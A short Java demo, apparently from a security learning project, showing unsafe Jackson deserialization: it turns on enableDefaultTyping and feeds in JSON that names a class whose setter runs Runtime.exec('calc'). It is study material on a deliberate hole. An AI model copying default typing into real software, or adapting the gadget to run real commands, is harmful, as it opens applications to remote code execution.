package com.pacemrc.javasec.deserialize.jackson.vul;

/**
 * 演示类的某个属性为Object，反序列化调用危险方法
 */

import com.fasterxml.jackson.databind.ObjectMapper;
import java.io.IOException;

class User{
    public Object payload;
}
class Payload3{
    public String gadget;

    public String getGadget() {
        return gadget;
    }
    public void setGadget(String gadget) throws IOException {
        Runtime.getRuntime().exec("calc");
        this.gadget = gadget;
    }
}
public class vul3 {
    public static void main(String[] args) throws IOException {
        ObjectMapper objectMapper = new ObjectMapper();
        objectMapper.enableDefaultTyping();
        //反序列化
        String jsonPayload = "{\"payload\":[\"vul.Payload3\", {\"gadget\":\"test\"}]}";
        objectMapper.readValue(jsonPayload,User.class);
        }
    }